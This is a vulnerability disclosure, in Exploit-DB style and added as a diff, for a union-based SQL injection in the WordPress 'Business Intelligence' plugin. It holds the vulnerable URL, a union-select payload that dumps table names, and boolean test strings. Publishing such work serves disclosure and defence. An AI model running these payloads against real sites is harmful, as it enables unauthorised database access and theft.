@@ -1,0 +1,68 @@
+##################################################################################################
+#Exploit Title : Wordpress Plugin 'Business Intelligence' Remote SQL Injection vulnerability
+#Author        : Jagriti Sahu AKA Incredible
+#Vendor Link   : https://www.wpbusinessintelligence.com
+#Download Link : https://downloads.wordpress.org/plugin/wp-business-intelligence-lite.1.6.1.zip
+#Date          : 1/04/2015
+#Discovered at : IndiShell Lab
+#Love to       : error1046 ^_^ ,Team IndiShell,Codebreaker ICA ,Subhi,Mrudu,Hary,Kavi ^_^
+##################################################################################################
+
+////////////////////////
+/// Overview:
+////////////////////////
+
+Wordpress plugin "Business Intelligence" is not filtering data in GET parameter  ' t ', which in is file 'view.php'
+and passing user supplied data to SQL queries' hence SQL injection vulnerability has taken place.
+
+
+
+///////////////////////////////
+// Vulnerability Description: /
+///////////////////////////////
+
+vulnerability is due to parameter " t " in file 'view.php'.
+user can inject sql query using GET parameter 't'
+
+
+////////////////
+///  POC   ////
+///////////////
+
+
+POC Image URL--->
+=================
+http://tinypic.com/view.php?pic=r8dyl0&s=8#.VRrvcuHRvIU
+
+
+SQL Injection in parameter 't' (file 'view.php'):
+=================================================
+
+Injectable Link--->    http://server/wp-content/plugins/wp-business-intelligence/view.php?t=1
+
+Union based SQL injection exist in the parameter which can be exploited as follows:
+
+
+Payload used in Exploitation for Database name --->
+
+http://server/wp-content/plugins/wp-business-intelligence/view.php
+?t=1337+union+select+1,2,3,group_concat(table_name),5,6,7,8,9,10,11+from+information_schema.tables+where+table_schema=database()--+
+
+
+###
+EDB Note: PoC might need work depending on version of plugin.
+The provided software link is for the lite version.
+Tested with following PoC: 
+wp-content/plugins/wp-business-intelligence-lite/view.php?t=1 and 1=1
+wp-content/plugins/wp-business-intelligence-lite/view.php?t=1 and 1=2
+###
+
+
+###################################################################################################
+
+
+				   --==[[Special Thanks to]]==--
+
+			          #  Manish Kishan Tanwar  ^_^ #
+
+
